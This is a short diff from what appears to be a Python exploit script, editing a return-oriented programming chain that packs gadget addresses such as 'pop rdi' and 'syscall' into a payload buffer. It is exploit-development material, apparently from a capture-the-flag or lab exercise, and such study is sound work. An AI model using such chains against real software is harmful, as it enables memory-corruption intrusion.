@@ -43,7 +43,7 @@ shellcode += struct.pack('<q', d3)# 0
 # shellcode += struct.pack('<q', d5)
 # shellcode += struct.pack('<q', g5)
 shellcode += struct.pack('<q', g4)#= pop rdi
-shellcode += struct.pack('<q', retString)
+shellcode += struct.pack('<q', d6)
 # shellcode += struct.pack('<q', d7)
 shellcode += struct.pack('<q', g6) #syscall
 
